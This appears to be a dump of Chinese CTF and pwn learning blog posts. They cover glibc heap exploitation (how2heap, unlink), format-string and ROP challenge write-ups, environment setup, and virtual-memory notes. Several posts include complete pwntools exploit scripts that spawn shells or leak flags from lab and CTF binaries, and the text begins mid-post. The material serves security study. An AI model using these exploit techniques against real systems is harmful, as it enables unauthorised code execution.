delete_note(index): sh.recvuntil(\"Your choice : \") sh.sendline(\"3\") sh.sendline(index) sh.recvuntil(\"Done !\\n\")def edit_note(index, size, stri): sh.recvuntil(\"Your choice : \") sh.sendline(\"2\") sh.recvuntil(\"Index :\") sh.sendline(index) sh.recvuntil(\"Size of note : \") sh.sendline(str(size)) sh.recvuntil(\"Content of note : \") sh.sendline(stri) sh.recvuntil(\"Done !\\n\") 申请三个note,使其足够大，避免free后被加入到fastbin中。因为fastbin中的空闲块不会合并，自然也就无法利用unlink了 1234payload = p64(0) + p64(0x90) + p64(buf-0x18) + p64(buf-0x10) + 'a'*0x70 + p64(0x90) + p64(0xa0)edit_note(\"0\", 0xa0, payload)delete_note(\"1\") 这时构造payload,unlink操作后buf = &amp;buf - 0x18 0x3 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *sh = process('./pwn')def add_note(size, stri): sh.recvuntil(\"Your choice : \") sh.sendline(\"1\") sh.recvuntil(\"Size of note : \") sh.sendline(str(size)) sh.recvuntil(\"Content of note:\") sh.sendline(stri) sh.recvuntil(\"Success!\\n\")def delete_note(index): sh.recvuntil(\"Your choice : \") sh.sendline(\"3\") sh.sendline(index) sh.recvuntil(\"Done !\\n\")def edit_note(index, size, stri): sh.recvuntil(\"Your choice : \") sh.sendline(\"2\") sh.recvuntil(\"Index :\") sh.sendline(index) sh.recvuntil(\"Size of note : \") sh.sendline(str(size)) sh.recvuntil(\"Content of note : \") sh.sendline(stri) sh.recvuntil(\"Done !\\n\")buf = 0x4040C0target = 0x4040A0add_note(0x90, \"1\") #0add_note(0x90, \"1\") #1add_note(0x90, \"1\") #2payload = p64(0) + p64(0x90) + p64(buf-0x18) + p64(buf-0x10) + 'a'*0x70 + p64(0x90) + p64(0xa0)edit_note(\"0\", 0xa0, payload)delete_note(\"1\")payload2 = 'a'*0x18 + p64(target)edit_note(\"0\", 0x18, payload2)eidt_note(\"0\", 0x8, p64(0x7E4))sh.interactive() 0x4 总结堆溢出&amp;&amp; unlink如果程序存在堆溢出漏洞，可以在当前chunk伪造一个小0x10的fake chunk,同时将下一个chunk头部的prve size修改，然后free下一chunk触发unlink。 1pre_size1 | size1 | fake_pre_size = pre_size1 ? pre_size1 + 0x10 : 0 | fake_size = size1 - 0x10 | &amp;target - 0x18 | &amp;target - 0x10 | padding | fake_size align | size2 &amp; ~1 要求target = P.结果target = &amp;target - 0x18.","tags":[]},{"title":"虚拟机安装以及pwn环境配置","date":"2019-09-19T17:29:12.000Z","path":"year/09/20/cl6ewldbn0066j63f2bhhczkz/","text":"0x1虚拟机的安装Ubuntu16虚拟机安装详细教程 0x2配置优化（加快下载速度）pip换源12345cd ~mkdir .pipcd .pip/touch pip.confsudo vim pip.conf pip.conf 123[global]trusted-host = mirrors.aliyun.comindex-url = https://mirrors.aliyun.com/pypi/simple apt换源在系统设置-软件和更新中修改. 修改为中国的阿里云 0x3虚拟机pwn环境配置123456789git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh#pwngdb,调试神器sudo apt-get install gcc-multilibsudo apt-get install libc6:i386#64位系统跑32位程序pip install pwntools#pwntools","tags":[]},{"title":"how2heap总结上","date":"2019-09-11T07:10:40.000Z","path":"year/09/11/cl6ewlda2002dj63f5xw1yojg/","text":"0x00 前言这篇文章是看过安全客上的一篇文章后自己做了一些总结，在此分享，下面贴出原文链接 how2heap总结上。不过在学习这些利用知识之前还是先推荐看一下华庭写的Glibc内存管理-Ptmalloc2源码分析。 0x01 测试环境Ubuntu 16.04.3 LTS x64 GLIBC 2.23 0x02 目录firtst_fit fastbin_dup fsatbin_dup_into_stack unsafe_unlink 0x03 first_fit源码： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main()&#123; fprintf(stderr, \"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\\n\"); fprintf(stderr, \"glibc uses a first-fit algorithm to select a free chunk.\\n\"); fprintf(stderr, \"If a chunk is free and large enough, malloc will select this chunk.\\n\"); fprintf(stderr, \"This can be exploited in a use-after-free situation.\\n\"); fprintf(stderr, \"Allocating 2 buffers. They can be large, don't have to be fastbin.\\n\"); char* a = malloc(512); char* b = malloc(256); char* c; fprintf(stderr, \"1st malloc(512): %p\\n\", a); fprintf(stderr, \"2nd malloc(256): %p\\n\", b); fprintf(stderr, \"we could continue mallocing here...\\n\"); fprintf(stderr, \"now let's put a string at a that we can read later \\\"this is A!\\\"\\n\"); strcpy(a, \"this is A!\"); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\\n\", a); fprintf(stderr, \"So, let's allocate 500 bytes\\n\"); c = malloc(500); fprintf(stderr, \"3rd malloc(500): %p\\n\", c); fprintf(stderr, \"And put a different string here, \\\"this is C!\\\"\\n\"); strcpy(c, \"this is C!\"); fprintf(stderr, \"3rd allocation %p points to %s\\n\", c, c); fprintf(stderr, \"first allocation %p points to %s\\n\", a, a); fprintf(stderr, \"If we reuse the first allocation, it now holds the data from the third allocation.\\n\");&#125; 输出： 个人总结 如果有一个空闲的且足够大的chunk，malloc会优先分配这个chunk。use-after-free就是这种机制的一个利用场景。 0x04 fastbin_dup源码： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file demonstrates a simple double-free attack with fastbins.\\n\"); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n\", a, b, a, a); fprintf(stderr, \"1st malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"3rd malloc(8): %p\\n\", malloc(8));&#125; 输出： 个人总结： 这个程序展示了double-free的攻击。我们发先连续free两次a，程序就会报错，因为这个时候这块内存刚好在对应free-list的顶部,再次free这块内存的时候就会被检查到。但是free掉a后再free b然后再free a程序就不会报错。因为这个时候a并不在链表顶部。 三次free后链表结构如下 其实应该是个循环结构 0x05 fastbin_dup_into_stack源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"This file extends on fastbin_dup.c by tricking malloc into\\n\" \"returning a pointer to a controlled location (in this case, the stack).\\n\"); unsigned long long stack_var; fprintf(stderr, \"The address we want malloc() to return is %p.\\n\", 8+(char *)&amp;stack_var); fprintf(stderr, \"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", a); fprintf(stderr, \"2nd malloc(8): %p\\n\", b); fprintf(stderr, \"3rd malloc(8): %p\\n\", c); fprintf(stderr, \"Freeing the first one...\\n\"); free(a); fprintf(stderr, \"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr, \"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr, \"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr, \"Now the free list has [ %p, %p, %p ]. \" \"We'll now carry out our attack by modifying data at %p.\\n\", a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", d); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"Now the free list has [ %p ].\\n\", a); fprintf(stderr, \"Now, we have access to %p while it remains at the head of the free list.\\n\" \"so now we are writing a fake free size (in this case, 0x20) to the stack,\\n\" \"so that malloc will think there is a free chunk there and agree to\\n\" \"return a pointer to it.\\n\", a); stack_var = 0x20; fprintf(stderr, \"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, \"3rd malloc(8): %p, putting the stack address on the free list\\n\", malloc(8)); fprintf(stderr, \"4th malloc(8): %p\\n\", malloc(8));&#125; 输出： 个人总结首先malloc了三次 123int *a = malloc(8);int *b = malloc(8);int *c = malloc(8); 紧接着free a -&gt; free b -&gt; free a 随后d = malloc(8),这时返回给d的地址与a相同 继续malloc(8),这时链表结构中只剩下了a，此时a仍在fastbin里是空闲的，但是我们现在已经可以随意修改a的fd指针等其它结构了。 *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));这条语句修改了a中的fd指针使其指向stack中的位置，伪造了一个chunk 再次连续malloc两次我们就可以成功返回栈地址了 0x06 unsafe_unlink源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123; fprintf(stderr, \"Welcome to unsafe unlink 2.0!\\n\"); fprintf(stderr, \"Tested in Ubuntu 14.04/16.04 64bit.\\n\"); fprintf(stderr, \"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n\"); fprintf(stderr, \"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\"); fprintf(stderr, \"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, \"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); fprintf(stderr, \"We create a fake chunk inside chunk0.\\n\"); fprintf(stderr, \"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n\"); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, \"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n\"); fprintf(stderr, \"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n\"); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, \"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]); fprintf(stderr, \"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]); //fprintf(stderr, \"We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\\n\"); //fprintf(stderr, \"With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\\n\"); //fprintf(stderr, \"P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\\n\"); //fprintf(stderr, \"If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\\n\"); //fprintf(stderr, \"We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\\n\"); //fprintf(stderr, \"1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\\n\"); //fprintf(stderr, \"2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\\n\"); //fprintf(stderr, \"3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\\n\"); //chunk0_ptr[1] = sizeof(size_t); //fprintf(stderr, \"In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr-&gt;size (%p)\\n\", ((char *)chunk0_ptr + chunk0_ptr[1]), &amp;chunk0_ptr[1]); //fprintf(stderr, \"You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\\n\\n\"); fprintf(stderr, \"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, \"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\"); fprintf(stderr, \"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\"); chunk1_hdr[0] = malloc_size; fprintf(stderr, \"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]); fprintf(stderr, \"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\"); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, \"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\"); fprintf(stderr, \"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\"); free(chunk1_ptr); fprintf(stderr, \"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\"); char victim_string[8]; strcpy(victim_string,\"Hello!~\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, \"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\"); fprintf(stderr, \"Original value: %s\\n\",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, \"New Value: %s\\n\",victim_string);&#125; 输出： 个人总结： 这个攻击方式的条件是要有在bss段上可以覆盖到的全局指针变量 12chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 首先malloc两次，取得两块chunk 12chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); 然后开始在chunk0中伪造一个chunk P，为了unlink时绕过P-&gt;fd-bk == P &amp;&amp; P-&gt;bk-&gt;fd == P的检测，设置了fd和bk指针。 1chunk1_hdr[0] = malloc_size; fake chunk的size字段和下一个堆块的presize字段(fd-&gt;presize)的值是一样的. 经过了这个设置,就可以过掉“(chunksize(P) != prev_size (next_chunk(P)) == False”的校验了. 因此,我们设置fake chunk的size字段为chunk0_[-3]:0x00000000 12chunk1_hdr[1] &amp;= ~1free(chunk1_ptr); 把chunk1设置为空闲状态，然后free掉chunk1，因为这时chunk0也是处于free状态，且这两个chunk相邻，所以就会unlink我们的fake chunk,然后修改chunk_ptr. 然后我们就可以利用chunk_ptr,自己改自己的值然后实现任意地址写。","tags":[]},{"title":"pwnable.xyz GrownUp","date":"2019-09-05T12:50:17.000Z","path":"year/09/05/cl6ewlda9002yj63fx4tl7hkt/","text":"一道格式化字符串漏洞题 寻找漏洞题目如下 可能溢出的地方有两个： read函数，但是src申请的空间是0x84读入数据限制在了0x80，没有发生溢出。 另一个是strcpy，又观察到下面有一个格式化字符串漏洞，那么就应该是利用这里了 寻找利用方法现在查看strcpy是否能让usr覆盖掉格式化字符串 发现偏移正好是0x80，导致我们无法直接覆盖掉格式化字符串。然后我就感觉。。。。。这个程序明明天衣无缝，根本没有漏洞。 围绕已知漏洞看看是不是漏掉了什么先看看字符串里有没有什么信息 好的，发现只要泄露这个地址的字符串就可以拿到flag 然后仔细想一下，其实read函数接受0x80个字符是不包括\\0的，然后strcpy复制过后会自动为字符串末尾加上\\0。这样就可以覆盖掉 qword_601160 这个地址的后两位。这样格式化字符串的地址就改变到了我们可以控制的位置。其实这就是off-by-one的思想，前几天接触堆的时候看见过不过没有深入。 总结其实这道题的知识点是都会的，就是以前做的栈题都是动辄覆盖返回地址，这道题只溢出了一个字符便没有引起自己足够的重视。下面是这道题的exp 1234567891011121314151617from pwn import *#sh = process('./GrownUpRedist')sh = remote('svc.pwnable.xyz',30004)flag = 0x601080payload = 'y' + 'A'*7 + p64(flag)sh.recvuntil('Are you 18 years or older? [y/N]: ')sh.send(payload)format_string = '%p %p %p %p %p %p %p %p %s %p %p %p'payload = ''payload += 'A' * 32 + format_string + 'A'*(0x80 - len(format_string))sh.recvuntil(\"Name: \")sh.send(payload)print sh.recvall()","tags":[]},{"title":"lce-ctf 2016 ropi","date":"2019-09-01T14:18:39.000Z","path":"year/09/01/cl6ewlda6002nj63frb55a3fi/","text":"这道rop题主要是考虑到rop链长度不够的问题，还有就是通过pop_ret调整参数位置使得其成功满足函数条件。这道题最大的收获就是做题要耐心，只要耐心思路清晰肯定能发现问题，一定不要急躁。 第一步还是分析文件格式和保护措施。 123456[*] '/home/wood/pwn/i_chunqiu/ROP/lce_Ctf2016/ropi' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 1ropi: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=5e2ed875c2a5f3b2df94f42bd7f82893b288559f, not stripped 文件32位并且没有PIE，然后先用IDA反汇编可以看到ezy函数中的read函数存在栈溢出。 12345678ssize_t ezy()&#123; char buf; // [esp+10h] [ebp-28h] puts(\"Benvenuti al convegno RetOri Pro!\\nVuole lasciare un messaggio?\"); fflush(stdout); return read(0, &amp;buf, 0x40u);&#125; 然后观察这个文件里的其它函数，看看有没有什么其它奇怪的函数和system函数以及系统调用等。果然发现了几个很有用的函数。 1234567891011int __cdecl ret(int a1) #打开flag文件&#123; if ( a1 != 0xBADBEEEF ) &#123; puts(\"chiave sbagliata! :(\"); exit(1); &#125; fd = open(\"./flag.txt\", 0); puts(\"[+] aperto\"); return fflush(stdout);&#125; 1234567891011int __cdecl ori(int a1, int a2) #将flag文件内容写入dati中&#123; if ( a1 != 0xABCDEFFF &amp;&amp; a2 != 0x78563412 ) &#123; puts(\"chiave sbagliata! :((\"); exit(1); &#125; read(fd, &amp;dati, 0x80u); puts(\"[+] leggi\"); return fflush(stdout);&#125; 123456int pro() #输出dati中的内容&#123; puts(\"[+] stampare\"); printf(\"%s\", &amp;dati); return fflush(stdout);&#125; 分析可知我们只需依次执行这三个函数，就可以拿到flag。然而构造完payload以后发现并没有成功获取flag，这时通过gdb.attach下断点动态调试(一般下在ret处)，通过一些有用的命令（如下）查看内存中数据的情况，我发现了payload超出了read的读入范围，于是分两次payload将这三个函数依次调用，拿到了flag。 12stack --100 查看栈上的值x/20wx $ebp+4 查看该函数的返回地址以及前四个参数 下面是这道题的exp 12345678910111213141516171819202122232425262728293031323334from pwn import *sh = process('./ropi')offset = 44ret = 0x8048569ori = 0x80485C4ret_a1 = 0xBADBEEEF #ret第一个参数ori_a1 = 0xABCDEFFF #ori第一个参数ori_a2 = 0x78563412 #ori第二个参数pro = 0x0804862Cezy = 0x804852Dpop_ret = 0x08048395payload = '' #先调用ret函数然后返回到ezy函数重新溢出payload += offset * 'a'payload += p32(ret)payload += p32(pop_ret)payload += p32(ret_a1)payload += p32(ezy)sh.recvuntil('Vuole lasciare un messaggio?')sh.sendline(payload)payload2 = '' #再次溢出调用ori和pro函数payload2 += offset*'a'payload2 += p32(ori)payload2 += p32(pro)payload2 += p32(ori_a1)payload2 += p32(ori_a2)sh.recvuntil('Vuole lasciare un messaggio?')sh.sendline(payload2)sh.interactive()","tags":[]},{"title":"simple_calc","date":"2019-08-21T06:50:12.000Z","path":"year/08/21/cl6ewldao003vj63f4ehwh8z7/","text":"i春秋上给的课后例题不错，近期打算把这上面的题刷一刷，巩固一下基础。还是一道简单的ROP练习题。 还是64位文件，保护措施是只开启了NX保护。ida f5反汇编以后查看主函数可以看到漏洞主要是在case5处的复制产生了栈溢出，程序里面没有system函数，所以可以先看一下能否使用系统调用我们可以看到果然有syscall命令，这样就可以调用execve(“bin/sh”)函数获取shell，需要满足的条件如下： RAX：59 RDI：RSP RSI：0 RDX：0我们需要找到下面的gadeget: pop rax, ret pop rid, rdx, ret mov rsi, rsp syscall脚本如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#!/usr/bin/python#coding:utf-8from pwn import *context.update(arch = 'amd64', os = 'linux', timeout = 1)io = remote('172.17.0.3', 10001)io.recv() #39次计算，ROP的长度io.sendline('39')#paddingfor i in range(18): io.sendline('2') io.sendline('42') io.sendline('42') sleep(0.1)#0x44db34--&gt;pop rax; retio.sendline('1')io.sendline('2256282')io.sendline('2256282')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x3b--&gt;rax = 0x3bio.sendline('2')io.sendline('101')io.sendline('42')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x401c87--&gt;pop rsi; retio.sendline('1')io.sendline('2100803')io.sendline('2100804')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x0--&gt;rsi = 0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x44db34--&gt;pop rdx; retio.sendline('1')io.sendline('2211138')io.sendline('2211139')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x0--&gt;rdx = 0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x400493--&gt;pop r12; retio.sendline('1')io.sendline('2097737')io.sendline('2097738')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x44db34--&gt;syscall; ret r12 = syscall addressio.sendline('1')io.sendline('2303090')io.sendline('2303091')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)#0x492468--&gt; mov rdi, rsp; call r12io.sendline('1')io.sendline('2396724')io.sendline('2396724')sleep(0.1)#地址高32位置0io.sendline('2')io.sendline('42')io.sendline('42')sleep(0.1)# /bin/sh\\0 =&gt; nib/ \\0hs/ rdi = rsp--&gt;\"/bin/sh\" addressio.sendline('1')io.sendline('926200087')io.sendline('926200088')sleep(0.1)io.sendline('1')io.sendline('3422615')io.sendline('3422616')sleep(0.1)io.sendline('5') #退出时程序将计算结果从堆复制到栈，劫持RIP到ROP链上io.interactive()","tags":[]},{"title":"一道简单的ROP题，关于文件中/sh字符串的寻找方法","date":"2019-08-21T03:50:43.000Z","path":"year/08/21/cl6ewld9v001wj63fuyedw234/","text":"这道题就是一道简单的ROP，主要学到了找字符串的方法，以前一直不是很清楚。 首先查看文件格式和保护措施，发现是64位文件动态链接，只开启了NX保护然后用ida反汇编查看程序主函数如下 12345678910111213141516171819202122signed __int64 Hello()&#123; signed __int64 result; // rax char s; // [rsp+0h] [rbp-50h] FILE *v2; // [rsp+48h] [rbp-8h] printf(\"Hello pwner, Send me your message here: \"); fflush(stdout); fgets(&amp;s, 192, stdin); v2 = fopen(\"bugsbunny.txt\", \"a\"); if ( v2 ) &#123; fwrite(&amp;s, 0x40uLL, 1uLL, v2); result = 0LL; &#125; else &#123; puts(\"So shorry cant talk to you now :( \"); result = 1LL; &#125; return result;&#125; 可以看出fgets出有栈溢出漏洞，我们可以通过这个漏洞劫持返回地址。同时我们在ida还发现了system函数，所以我们只需要调用system函数并满足其参数需要就可以成功拿到shell。以下命令十分好用然后就可以构造ROP链写脚本了 1234567891011121314151617181920#!/usr/bin/python#coding:utf-8from pwn import *context.update(arch = 'amd64', os = 'linux', timeout = 1)io = remote('172.17.0.3', 10001)call_system = 0x40075f #call system指令在内存中的位置binsh = 0x4003ef #字符串\"sh\"在内存中的位置pop_rdi = 0x400883 #pop rdi; retnpayload = \"\"payload += \"A\"*88 #paddingpayload += p64(pop_rdi) payload += p64(binsh) #rdi指向字符串\"sh\"payload += p64(call_system) #调用system执行system(\"sh\")io.sendline(payload)io.interactive()","tags":[]},{"title":"什么是pwn,新手如何入门?","date":"2019-08-10T02:19:59.000Z","path":"year/08/10/cl6ewldav004fj63fmroam5a8/","text":"阅读本文需要的知识储备 了解C语言函数的概念 了解C语言指针的概念 什么是漏洞？漏洞会有什么危害？暑假里小明（ctfer）今天去找小红玩耍，却发现刚高考完的小红居然在家自学C语言！沉溺于码代码的小红根本无暇搭理小明，为了搭讪小明无奈凑上前去，在屏幕上看到了如下代码：12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(\"You Hava already controlled it.\"); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 小红看着自己代码，志得意满的将自己的代码运行了，可是第三行的success函数并没有执行。呀！原来是自己的主函数里只调用了vulnerable函数，忘记调用success函数了。小红正准备修改自己的代码，却听见小明大喊一声，“慢着！我有办法让你不修改代码也能成功调用success函数。”只见小明一番操作，在小红怀疑的目光下，小明果真将success函数成功调用了。之间屏幕上出现了如下显示（linux界面） 12345678910➜ stack-example python exp.py[+] Starting local process './stack_example': pid 61936;\\x84\\x0[*] Switching to interactive modeaaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0You Hava already controlled it.[*] Got EOF while reading in interactive$ [*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)[*] Got EOF while sending in interactive 第一行运行了攻击脚本在第六行，”You Hava already controlled it.”，字符串被成功输出 小红顿生疑惑：“这是为什么呀，代码里并没有调用这个success函数，为什么你还能成功调用它？” 小明嘿嘿一笑：“因为你的代码里存在着缓冲区溢出漏洞！你看你代码第5行的char s[12]只给这个s分配了12字节的空间，但是你第6行的gets(s),可以没有长度限制的向s里面输入数据。超出6字节大小的数据就会覆盖到内存里其它区域的位置。别人利用这个漏洞，轻则可以调用想调用的函数，获取你程序里的其它数据，重则拿到你系统的操作权限。以后写代码的时候你可长点心吧！” 小红看向小明的眼神顿时充满了崇拜：“那么你能不能教教我怎么利用这种漏洞？” 小明心花怒放：“当然没有问题，其实这只是最基础的一种漏洞，其它漏洞还有很多很多。但是即使是最基础的漏洞，你也要学一些基础的技能，才能够很好的利用他们，这些技能有： 扎实的C语言功底，特别是链表和指针这一块，你对语言不够熟悉怎么能发现他们的漏洞是吧？ 汇编基础语法（对重点语句call，leave，retn等要有较深的理解）重点对汇编层面的函数调用有较好理解。（平时我们的C语言程序都要先翻译成汇编语言然后再翻译成机器语言然后才能执行，因为计算机其实只认识由0和1组成的机器语言。而汇编语言可以比C语言更低一层，属于低级语言，所以可以反映出更多程序运行的细节，我们也就是通过这些细节来发现和利用漏洞的。） python基础语法。我们利用漏洞要用python写脚本进行攻击的呀！ linux基本命令。因为linux比较简单，我们前期的漏洞挖掘和利用主要再linux环境下的，所以你最好装个虚拟机哦。 “哇，看起来要学好多东西，可是我还什么都不会呢，我该从何学起呀？”小红疑惑道。 “先把C语言基础打好，C语言基础打好以后推荐中国大学mooc上南京大学袁春风老师的慕课，《计算机系统基础》(建议新生观看一，二，五，六，七，八周的课程），这个课能帮你建立一个计算机系统观，对以后的学习很有好处，里面也有你所需要的汇编知识呢，你先学这些，学完以后随时找我！”，小明潇洒的摆了摆手。其它补充资料：汇编语言（王爽），深入理解计算机系统。 “哇，那太好了！”小红说着依偎在了小明怀中，从此他们幸福的走在了一起。","tags":[]},{"title":"第九章 虚拟内存","date":"2019-07-15T10:07:22.000Z","path":"year/07/15/cl6ewldbe005kj63f4tjo81zw/","text":"虚拟内存一个系统中的进程是与其它进程共享CPU和主存资源的。虚拟内存提供了三个重要的能力: 它将主存看成是一个存贮在硬盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据，通过这种方式，它高效使用了主存。 它为每个进程提供了一致的地址空间，从而简化了内存管理。 它保护了每个进程的地址空间不被其它进程破坏。 虚拟内存作为缓存的工具概念上而言，虚拟内存被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每个字节都有唯一的虚拟地址，作为数组的索引。磁盘上数组的内容被缓存在主存中。和存储器层次结构中的其它缓存一样，磁盘（较低层）上的数据被分割成块，这些块作为磁盘和主存（较高层）之间的传送单元。VM系统通过将虚拟内存分割为称为虚拟页(Virtual Page, VP)的大小固定的块来处理这个问题。类似的，物理内存被分割为物理页，也被称为页帧。在任意时刻，虚拟页面的集合都分为三个不相交的子集: 未分配的：VM系统还未分配（或者创建）的页。未分配的块没有任何数据和它们关联，因此也不用占据任何磁盘空间。 缓存的：当前已缓存在物理内存中的已分配页。 